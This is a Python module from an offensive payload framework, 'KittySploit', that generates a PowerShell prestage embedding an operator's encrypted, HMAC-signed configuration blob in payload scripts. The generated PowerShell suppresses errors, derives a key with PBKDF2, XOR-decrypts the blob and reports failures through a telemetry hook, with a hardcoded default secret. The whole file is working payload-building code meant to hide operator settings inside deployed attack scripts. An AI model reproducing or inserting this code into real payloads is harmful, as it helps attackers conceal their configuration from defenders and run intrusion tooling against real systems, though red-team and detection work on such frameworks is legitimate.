#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *
from core.payload_generation.prestage.signed_config_context import resolve_signed_config_context


class Module(Prestage):
    PRESTAGE_ID = "signed_config"

    __info__ = {
        "name": "Signed Config (PowerShell)",
        "description": "Embed encrypted and signed operator config separate from the payload body",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "config", "powershell"],
    }

    config_json = OptString("", "Inline JSON object to encrypt/sign at generation time", False)
    config_file = OptFile("", "JSON config file on operator machine", False)
    config_secret = OptString("", "Encryption secret (default: kitty-signed-config)", False)
    config_sign_key = OptString("", "HMAC signing key (default: config_secret)", False)

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        cfg = resolve_signed_config_context(self, context)
        blob_b64 = str(cfg.get("blob_b64") or "").strip()
        if not blob_b64:
            return "# signed_config: set prestage_config or config_json"
        secret = str(cfg.get("config_secret") or "kitty-signed-config").replace("'", "''")
        sign_key = str(cfg.get("config_sign_key") or secret).replace("'", "''")
        return f"""
$ErrorActionPreference='SilentlyContinue'
$global:_kittySignedConfigBlob='{blob_b64}'
$global:_kittySignedConfigSecret='{secret}'
$global:_kittySignedConfigSignKey='{sign_key}'
function _KittyDeriveKey([string]$secret,[byte[]]$salt) {{
  $derive=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($secret,$salt,120000,[System.Security.Cryptography.HashAlgorithmName]::SHA256)
  return $derive.GetBytes(32)
}}
function _KittyXorStream([byte[]]$data,[byte[]]$key) {{
  $out=New-Object byte[] $data.Length
  for($i=0;$i -lt $data.Length;$i++){{ $out[$i]=$data[$i] -bxor $key[$i % $key.Length] }}
  return $out
}}
function _KittyUnpackSignedConfig([string]$blobB64,[string]$secret,[string]$signKey) {{
  $outer=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blobB64))
  $env=$outer | ConvertFrom-Json
  $salt=[Convert]::FromBase64String([string]$env.salt)
  $payload=[Convert]::FromBase64String([string]$env.data)
  $key=_KittyDeriveKey ($secret) $salt
  $plain=_KittyXorStream $payload $key
  $hmac=New-Object System.Security.Cryptography.HMACSHA256([Text.Encoding]::UTF8.GetBytes($signKey))
  $sig=([BitConverter]::ToString($hmac.ComputeHash($plain))).Replace('-','').ToLower()
  if($sig -ne [string]$env.sig){{ throw 'signed_config signature mismatch' }}
  return ([Text.Encoding]::UTF8.GetString($plain) | ConvertFrom-Json)
}}
$global:_kitty_signed_config=$null
$global:_kitty_signed_config_error=''
try {{
  if($global:_kittySignedConfigBlob){{
    $global:_kitty_signed_config=_KittyUnpackSignedConfig $global:_kittySignedConfigBlob $global:_kittySignedConfigSecret $global:_kittySignedConfigSignKey
  }}
}} catch {{
  $global:_kitty_signed_config_error=$_.Exception.Message
  try {{ _KittyTelemetryRecord 'signed_config' 'unpack_failed' $global:_kitty_signed_config_error }} catch {{}}
}}
""".strip()
